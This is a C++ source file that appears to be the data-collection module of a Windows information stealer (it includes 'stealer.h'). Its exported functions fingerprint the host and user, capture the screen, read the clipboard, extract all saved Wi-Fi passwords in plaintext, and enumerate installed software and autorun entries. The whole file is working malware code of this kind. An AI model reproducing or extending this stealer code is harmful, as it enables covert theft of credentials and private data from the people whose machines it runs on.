#include "stealer.h"
#include <windows.h>
#include <shlobj.h>
#include <wlanapi.h>
#include <iphlpapi.h>
#include <string>
#include <sstream>
#include <vector>
#include <cstring>

#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "wlanapi.lib")

// ── Helpers ───────────────────────────────────────────────────────────────────

static std::string wstr_to_utf8(const std::wstring& ws) {
    if (ws.empty()) return {};
    int n = WideCharToMultiByte(CP_UTF8, 0, ws.c_str(), -1, nullptr, 0, nullptr, nullptr);
    std::string s(n - 1, '\0');
    WideCharToMultiByte(CP_UTF8, 0, ws.c_str(), -1, s.data(), n, nullptr, nullptr);
    return s;
}

static std::wstring utf8_to_wstr(const std::string& s) {
    if (s.empty()) return {};
    int n = MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, nullptr, 0);
    std::wstring ws(n - 1, L'\0');
    MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, ws.data(), n);
    return ws;
}

static std::string escape_json(const std::string& s) {
    std::string out;
    for (unsigned char c : s) {
        switch (c) {
            case '"':  out += "\\\""; break;
            case '\\': out += "\\\\"; break;
            case '\n': out += "\\n";  break;
            case '\r': out += "\\r";  break;
            case '\t': out += "\\t";  break;
            default:
                if (c < 0x20) { char buf[8]; snprintf(buf, sizeof(buf), "\\u%04x", c); out += buf; }
                else out += (char)c;
        }
    }
    return out;
}

static std::string reg_read_sz(HKEY root, const char* subkey, const char* value) {
    HKEY hKey;
    if (RegOpenKeyExA(root, subkey, 0, KEY_READ, &hKey) != ERROR_SUCCESS) return "";
    char buf[512] = {};
    DWORD sz = sizeof(buf);
    RegQueryValueExA(hKey, value, nullptr, nullptr, (LPBYTE)buf, &sz);
    RegCloseKey(hKey);
    return std::string(buf);
}

// ── Core System Info ──────────────────────────────────────────────────────────

extern "C" int zed_system_collect_info(char* out_json, int buf_size) {
    std::ostringstream j;
    j << "{";

    // Hostname
    char host[MAX_COMPUTERNAME_LENGTH + 1] = {};
    DWORD hsz = sizeof(host);
    GetComputerNameA(host, &hsz);
    j << "\"hostname\":\"" << escape_json(host) << "\",";

    // Username
    char user[256] = {};
    DWORD usz = sizeof(user);
    GetUserNameA(user, &usz);
    j << "\"username\":\"" << escape_json(user) << "\",";

    // OS version via RtlGetVersion
    OSVERSIONINFOEXA osvi = {};
    osvi.dwOSVersionInfoSize = sizeof(osvi);
    typedef LONG(WINAPI* RtlGetVer)(OSVERSIONINFOEXA*);
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll) {
        auto fn = (RtlGetVer)GetProcAddress(hNtdll, "RtlGetVersion");
        if (fn) fn(&osvi);
    }
    char osbuf[64];
    snprintf(osbuf, sizeof(osbuf), "Windows %lu.%lu (Build %lu)",
             osvi.dwMajorVersion, osvi.dwMinorVersion, osvi.dwBuildNumber);
    j << "\"os\":\"" << escape_json(osbuf) << "\",";

    // RAM
    MEMORYSTATUSEX ms = {};
    ms.dwLength = sizeof(ms);
    GlobalMemoryStatusEx(&ms);
    j << "\"ram_mb\":" << (ms.ullTotalPhys / (1024 * 1024)) << ",";

    // CPU
    std::string cpu = reg_read_sz(HKEY_LOCAL_MACHINE,
        "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", "ProcessorNameString");
    j << "\"cpu\":\"" << escape_json(cpu) << "\",";

    // Disk
    ULARGE_INTEGER free_b, total_b;
    GetDiskFreeSpaceExA("C:\\", &free_b, &total_b, nullptr);
    j << "\"disk_total_gb\":" << (total_b.QuadPart / (1024*1024*1024)) << ",";
    j << "\"disk_free_gb\":"  << (free_b.QuadPart  / (1024*1024*1024)) << ",";

    // GPU (same call chain as zed_system_get_gpu)
    std::string gpu;
    HKEY hVid;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SYSTEM\\CurrentControlSet\\Control\\Video", 0, KEY_READ, &hVid) == ERROR_SUCCESS) {
        char subkey[256] = {};
        DWORD i = 0, sksz = sizeof(subkey);
        if (RegEnumKeyExA(hVid, i, subkey, &sksz, nullptr, nullptr, nullptr, nullptr) == ERROR_SUCCESS) {
            std::string full = std::string("SYSTEM\\CurrentControlSet\\Control\\Video\\")
                             + subkey + "\\0000";
            gpu = reg_read_sz(HKEY_LOCAL_MACHINE, full.c_str(), "HardwareInformation.AdapterString");
            if (gpu.empty())
                gpu = reg_read_sz(HKEY_LOCAL_MACHINE, full.c_str(), "DriverDesc");
        }
        RegCloseKey(hVid);
    }
    j << "\"gpu\":\"" << escape_json(gpu.empty() ? "Unknown" : gpu) << "\"";

    j << "}";
    std::string result = j.str();
    int copy_len = ((int)result.size() < buf_size - 1) ? (int)result.size() : buf_size - 1;
    memcpy(out_json, result.c_str(), copy_len);
    out_json[copy_len] = '\0';
    return 1;
}

// ── GPU Name ──────────────────────────────────────────────────────────────────

extern "C" int zed_system_get_gpu(char* out_buf, int buf_size) {
    HKEY hVid;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SYSTEM\\CurrentControlSet\\Control\\Video", 0, KEY_READ, &hVid) != ERROR_SUCCESS)
        return 0;

    char subkey[256] = {};
    DWORD sksz = sizeof(subkey);
    std::string gpu;
    if (RegEnumKeyExA(hVid, 0, subkey, &sksz, nullptr, nullptr, nullptr, nullptr) == ERROR_SUCCESS) {
        std::string full = std::string("SYSTEM\\CurrentControlSet\\Control\\Video\\")
                         + subkey + "\\0000";
        gpu = reg_read_sz(HKEY_LOCAL_MACHINE, full.c_str(), "HardwareInformation.AdapterString");
        if (gpu.empty())
            gpu = reg_read_sz(HKEY_LOCAL_MACHINE, full.c_str(), "DriverDesc");
    }
    RegCloseKey(hVid);

    if (gpu.empty()) { strncpy_s(out_buf, buf_size, "Unknown", _TRUNCATE); return 0; }
    strncpy_s(out_buf, buf_size, gpu.c_str(), _TRUNCATE);
    return 1;
}

// ── Screenshot ────────────────────────────────────────────────────────────────

extern "C" int zed_system_screenshot(const char* out_path) {
    HDC hdc     = GetDC(NULL);
    HDC hdc_mem = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    HBITMAP hbmp = CreateCompatibleBitmap(hdc, w, h);
    SelectObject(hdc_mem, hbmp);
    BitBlt(hdc_mem, 0, 0, w, h, hdc, 0, 0, SRCCOPY);

    BITMAPFILEHEADER bfh = {};
    BITMAPINFOHEADER bih = {};
    bih.biSize        = sizeof(BITMAPINFOHEADER);
    bih.biWidth       = w;
    bih.biHeight      = -h;
    bih.biPlanes      = 1;
    bih.biBitCount    = 24;
    bih.biCompression = BI_RGB;
    int row_stride    = ((w * 3 + 3) & ~3);
    bih.biSizeImage   = row_stride * h;
    bfh.bfType        = 0x4D42;
    bfh.bfOffBits     = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    bfh.bfSize        = bfh.bfOffBits + bih.biSizeImage;

    std::vector<BYTE> pixels((size_t)bih.biSizeImage);
    BITMAPINFO bi = {};
    bi.bmiHeader = bih;
    GetDIBits(hdc, hbmp, 0, (UINT)h, pixels.data(), &bi, DIB_RGB_COLORS);

    HANDLE hf = CreateFileA(out_path, GENERIC_WRITE, 0, nullptr,
                            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hf != INVALID_HANDLE_VALUE) {
        DWORD written = 0;
        WriteFile(hf, &bfh, sizeof(bfh), &written, nullptr);
        WriteFile(hf, &bih, sizeof(bih), &written, nullptr);
        WriteFile(hf, pixels.data(), (DWORD)pixels.size(), &written, nullptr);
        CloseHandle(hf);
    }
    DeleteObject(hbmp);
    DeleteDC(hdc_mem);
    ReleaseDC(NULL, hdc);
    return 1;
}

// ── Clipboard ─────────────────────────────────────────────────────────────────

extern "C" int zed_system_clipboard(char* out_buf, int buf_size) {
    if (!OpenClipboard(nullptr)) return 0;
    HANDLE hData = GetClipboardData(CF_TEXT);
    if (!hData) { CloseClipboard(); return 0; }
    char* pText = static_cast<char*>(GlobalLock(hData));
    if (!pText) { CloseClipboard(); return 0; }
    int len = (int)strlen(pText);
    int copy_len = (len < buf_size - 1) ? len : buf_size - 1;
    memcpy(out_buf, pText, copy_len);
    out_buf[copy_len] = '\0';
    GlobalUnlock(hData);
    CloseClipboard();
    return copy_len;
}

// ── WiFi Passwords ────────────────────────────────────────────────────────────

extern "C" int zed_system_wifi_passwords(char* out_json, int buf_size) {
    std::ostringstream json;
    json << "[";
    int count = 0;

    HANDLE hClient = nullptr;
    DWORD  ver     = 0;
    if (WlanOpenHandle(2, nullptr, &ver, &hClient) != ERROR_SUCCESS)
        goto finish;

    {
        PWLAN_INTERFACE_INFO_LIST iface_list = nullptr;
        if (WlanEnumInterfaces(hClient, nullptr, &iface_list) != ERROR_SUCCESS)
            goto close_handle;

        for (DWORD i = 0; i < iface_list->dwNumberOfItems; i++) {
            PWLAN_PROFILE_INFO_LIST profile_list = nullptr;
            GUID& guid = iface_list->InterfaceInfo[i].InterfaceGuid;

            if (WlanGetProfileList(hClient, &guid, nullptr, &profile_list) != ERROR_SUCCESS)
                continue;

            for (DWORD p = 0; p < profile_list->dwNumberOfItems; p++) {
                std::wstring wssid = profile_list->ProfileInfo[p].strProfileName;
                std::string  ssid  = wstr_to_utf8(wssid);

                LPWSTR xml_str = nullptr;
                DWORD flags = WLAN_PROFILE_GET_PLAINTEXT_KEY;
                DWORD access = 0;
                if (WlanGetProfile(hClient, &guid, wssid.c_str(), nullptr,
                                   &xml_str, &flags, &access) != ERROR_SUCCESS)
                    continue;

                // Extract <keyMaterial> from the XML profile
                std::string xml = wstr_to_utf8(std::wstring(xml_str));
                WlanFreeMemory(xml_str);

                std::string password;
                const std::string key_open  = "<keyMaterial>";
                const std::string key_close = "</keyMaterial>";
                size_t ks = xml.find(key_open);
                size_t ke = xml.find(key_close);
                if (ks != std::string::npos && ke != std::string::npos) {
                    ks += key_open.size();
                    password = xml.substr(ks, ke - ks);
                }

                if (count > 0) json << ",";
                json << "{\"ssid\":\"" << escape_json(ssid)
                     << "\",\"password\":\"" << escape_json(password) << "\"}";
                count++;
            }
            WlanFreeMemory(profile_list);
        }
        WlanFreeMemory(iface_list);
    }

close_handle:
    WlanCloseHandle(hClient, nullptr);
finish:
    json << "]";
    std::string result = json.str();
    int copy_len = ((int)result.size() < buf_size - 1) ? (int)result.size() : buf_size - 1;
    memcpy(out_json, result.c_str(), copy_len);
    out_json[copy_len] = '\0';
    return count;
}

// ── Installed Apps ────────────────────────────────────────────────────────────

extern "C" int zed_system_installed_apps(char* out_json, int buf_size) {
    std::ostringstream json;
    json << "[";
    int count = 0;

    const char* reg_paths[] = {
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
        "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
        nullptr
    };

    for (int ri = 0; reg_paths[ri]; ri++) {
        HKEY hBase;
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, reg_paths[ri], 0, KEY_READ, &hBase) != ERROR_SUCCESS)
            continue;

        char subkey[256];
        DWORD idx = 0, sksz = sizeof(subkey);
        while (RegEnumKeyExA(hBase, idx++, subkey, &sksz, nullptr, nullptr, nullptr, nullptr) == ERROR_SUCCESS) {
            sksz = sizeof(subkey);
            std::string full = std::string(reg_paths[ri]) + "\\" + subkey;
            std::string name    = reg_read_sz(HKEY_LOCAL_MACHINE, full.c_str(), "DisplayName");
            std::string version = reg_read_sz(HKEY_LOCAL_MACHINE, full.c_str(), "DisplayVersion");
            std::string pub     = reg_read_sz(HKEY_LOCAL_MACHINE, full.c_str(), "Publisher");
            if (name.empty()) continue;
            if (count > 0) json << ",";
            json << "{\"name\":\""    << escape_json(name)    << "\","
                 << "\"version\":\""  << escape_json(version) << "\","
                 << "\"publisher\":\"" << escape_json(pub)    << "\"}";
            count++;
        }
        RegCloseKey(hBase);
    }

    json << "]";
    std::string result = json.str();
    int copy_len = ((int)result.size() < buf_size - 1) ? (int)result.size() : buf_size - 1;
    memcpy(out_json, result.c_str(), copy_len);
    out_json[copy_len] = '\0';
    return count;
}

// ── Startup Items ─────────────────────────────────────────────────────────────

extern "C" int zed_system_startup_items(char* out_json, int buf_size) {
    std::ostringstream json;
    json << "[";
    int count = 0;

    const struct { HKEY root; const char* path; } run_keys[] = {
        { HKEY_CURRENT_USER,  "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" },
        { HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" },
        { HKEY_LOCAL_MACHINE, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run" },
    };

    for (auto& rk : run_keys) {
        HKEY hKey;
        if (RegOpenKeyExA(rk.root, rk.path, 0, KEY_READ, &hKey) != ERROR_SUCCESS) continue;

        char  name[256]; DWORD namesz;
        char  data[1024]; DWORD datasz, type;
        DWORD idx = 0;
        namesz = sizeof(name); datasz = sizeof(data);
        while (RegEnumValueA(hKey, idx++, name, &namesz, nullptr, &type,
                             (LPBYTE)data, &datasz) == ERROR_SUCCESS) {
            namesz = sizeof(name); datasz = sizeof(data);
            if (type != REG_SZ) continue;
            if (count > 0) json << ",";
            json << "{\"name\":\""    << escape_json(name) << "\","
                 << "\"command\":\"" << escape_json(data) << "\"}";
            count++;
        }
        RegCloseKey(hKey);
    }

    json << "]";
    std::string result = json.str();
    int copy_len = ((int)result.size() < buf_size - 1) ? (int)result.size() : buf_size - 1;
    memcpy(out_json, result.c_str(), copy_len);
    out_json[copy_len] = '\0';
    return count;
}
